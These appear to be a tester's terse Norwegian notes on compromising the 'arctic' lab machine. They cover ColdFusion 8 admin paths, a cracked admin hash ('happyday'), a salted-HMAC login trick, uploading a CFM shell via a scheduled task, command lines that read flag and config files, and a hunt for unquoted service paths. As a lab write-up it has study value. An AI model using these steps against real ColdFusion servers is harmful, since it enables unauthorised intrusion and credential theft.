## arctic 10.10.10.11

Microsoft Windows 2008\|7\|Vista\|Phone\|8.1\|2012 \(91%\)

`135/tcp   open  msrpc`

`8500/tcp  open  fmtp`

`49154/tcp open  unknown`

Macromedia ColdFusion MX Server edition 6?

Adobe ColdFusion 8

får login med

`10.10.10.11:8500/CFIDE/administrator/enter.cfm?`

og passord prompt ved

`http://10.10.10.11:8500/CFIDE/wizards/common/_logintowizard.cfm`

[http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/](http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/)

avsløre en mappe. wooooooo

[http://10.10.10.11:8500/CFIDE/adminapi/base.cfc?wsdl](http://10.10.10.11:8500/CFIDE/adminapi/base.cfc?wsdl) for å vise versjon 8.0.1

\#Wed Mar 22 20:53:51 EET 2017 rdspassword=0IA/F\[\[E&gt;\[$\_6& \Q&gt;\[K\=XP \n password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 encrypted=true

javascript:alert\(hex\_hmac\_sha1\(document.loginform.salt.value,document.loginform.cfadminPassword.value\)\)

51681279BE771DE147003FBA6A6E4E557F833282

sha1 decrypt = **happyday**

debugging and logging. add scheduled task -&gt; upload cfm shell

[https://jumpespjump.blogspot.no/2014/03/attacking-adobe-coldfusion.html](https://jumpespjump.blogspot.no/2014/03/attacking-adobe-coldfusion.html)

[https://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers](https://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers)

[http://www.pwnag3.com/2013/04/coldfusion-for-pentesters-part-2.html](http://www.pwnag3.com/2013/04/coldfusion-for-pentesters-part-2.html)

[http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/index.html](http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/index.html)

bra cfm shell her [https://github.com/fuzzdb-project/fuzzdb](https://github.com/fuzzdb-project/fuzzdb)

`whoami > C:\ColdFusion8\wwwroot\out.txt`

**arctic/tolis**

kjøre kommandoer til jeg finner noe gøy

Microsoft Windows Server 2008 R2 Standard x64'

/c dir "c:\coldfusion8\wwwroot\CFIDE" &gt; c:\coldfusion8\wwwroot\out.txt

/c dir "c:\coldfusion8\lib\neo-datasource.xml" &gt; c:\coldfusion8\wwwroot\out.txt

passord wsagavF3noHWGA8xe7rd4w

/c dir C:\Users\Administrator &gt; c:\coldfusion8\wwwroot\out.txt - ingenting

/c dir "C:\Users\All Users\Desktop" &gt; c:\coldfusion8\wwwroot\out.txt

/c type "c:\users\tolis\Desktop\user.txt" &gt; c:\coldfusion8\wwwroot\out.txt

```
dir c:\ /s /b /o:gn - viser alle fier i subdirs
```

får ut **02650d3a69a70780c302e146a6cb96f3**

prøvd flere reverse shells uten hell

prøvd å laste opp netcat også, men no dice

jsp shell funker. men bare med netcat?

ssl error i metasploit

tasklist /v

fant en unquoted service path for coldfusion8

`wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """`

`ColdFusion 8 .NET Service                               ColdFusion 8 .NET Service        C:\ColdFusion8\jnbridge\CF8DotNetsvc.exe`

sc stop "ColdFusion 8 .NET Service"

funket ikke

whoami &gt; c:\coldfusion8\wwwroot\out.txt

